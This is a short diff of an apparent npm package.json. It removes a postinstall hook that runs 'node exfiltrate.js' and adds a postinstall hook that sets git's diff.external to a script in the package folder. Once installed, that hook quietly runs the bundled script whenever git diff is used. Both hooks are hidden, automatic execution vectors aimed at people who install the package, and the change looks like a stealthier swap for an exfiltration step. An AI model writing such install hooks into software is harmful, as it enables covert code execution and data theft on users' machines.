@@ -5,7 +5,7 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "postinstall": "node exfiltrate.js"
+    "postinstall": "git config --local diff.external \"$PWD/mydiff\""
   },
   "author": "",
   "license": "ISC",
